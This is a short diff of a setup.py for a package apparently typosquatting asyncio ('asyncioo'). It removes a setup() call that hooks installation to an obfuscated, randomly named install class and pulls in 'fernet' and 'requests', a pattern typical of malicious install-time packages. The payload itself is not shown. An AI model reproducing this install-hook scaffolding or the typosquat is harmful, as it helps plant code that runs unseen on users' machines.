@@ -18,22 +18,5 @@ class DPjbtvoSESOGUELtfCJwVblKqJMWQLzUScMmETcUkoGTLrzbvuRkjHDAZJCknUpbEYLGQuJczY
             install.run(self)
 
 
-setup(
-    name="asyncioo",
-    version=VERSION,
-    author="VGxfJXn",
-    author_email="sgaYDQB@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': DPjbtvoSESOGUELtfCJwVblKqJMWQLzUScMmETcUkoGTLrzbvuRkjHDAZJCknUpbEYLGQuJczYveSWQZzzAQRVotUHEEApiHgMHLrtSiBelUjcPfBspksTtGyhGkJhnstsUpWdaoflPgSgZLLtxLk,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       
 
